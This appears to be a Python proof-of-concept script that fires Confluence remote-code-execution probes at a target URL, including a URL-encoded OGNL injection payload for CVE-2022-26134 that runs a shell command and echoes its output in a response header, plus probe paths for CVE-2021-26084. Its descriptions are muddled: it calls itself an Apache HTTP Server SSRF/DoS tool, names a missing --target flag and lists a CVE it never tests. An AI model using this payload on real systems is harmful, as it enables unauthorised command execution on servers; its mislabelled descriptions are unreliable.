import requests
import argparse

# Display basic tool information
def display_info():
    info = """
Category : Apache Confluence
Developer : MIR Team
Version   : 1.0.2
Develop Time : 2025-1-10
----------------------------------------------
CVE-2022-26134, CVE-2021-26084, CVE-2023-22527
"""
    print(info)

# Display about information
def show_about():
    about_text = """
    This is a Proof of Concept (PoC) for testing various vulnerabilities
    in Apache HTTP Server including SSRF, Denial of Service, and Filename Confusion Attacks.
    Developed by the A Cyber Security Team.
    """
    print(about_text)

# Function to test the vulnerability with multiple bypass attempts
def check_protected_file(target_url):
    # List of potential attack URLs
    test_urls = [
        f"{target_url}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/", #CVE-2022-26134 (Atlassian Confluence RCE)
        f"{target_url}/pages/doenterpagevariables.action?SpaceKey=x",     #CVE-2021-26084      
        f"{target_url}/template/aui/text-inline.vm",           #CVE-2021-26084
       
    ]

    # Loop through each URL and test the response
    for test_url in test_urls:
        print(f"Testing URL: {test_url}")
        response = requests.get(test_url)
        
        # Display response status code and check for potential bypass success
        print(f"URL Status Code: {response.status_code}")
        if response.status_code == 200:
            print(f"[!] Bypass successful for URL: {test_url}")
        elif response.status_code == 302:
            print(f"[!] Check Bypass successful : {test_url}")
        else:
            print(f"[*] No bypass or blocked for URL: {test_url}")
        print("-" * 50)

# Function to handle command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="Apache HTTP Server Vulnerability Testing Tool")
    parser.add_argument('url', type=str, help='Target URL to test (e.g., http://example.com)')
    parser.add_argument('--info', action='store_true', help='Display tool information')
    parser.add_argument('--about', action='store_true', help='Show about this PoC')
    return parser.parse_args()

if __name__ == "__main__":
    # Automatically display tool info when the script starts
    display_info()

    # Parse command-line arguments
    args = parse_arguments()

    # Display about information if --about is provided
    if args.about:
        show_about()
    
    # Run the attack check if --target is provided
    if args.url:
        check_protected_file(args.url)
    else:
        if not args.info and not args.about:
            print("Please provide a target URL with --target, or use --info or --about for more information.")
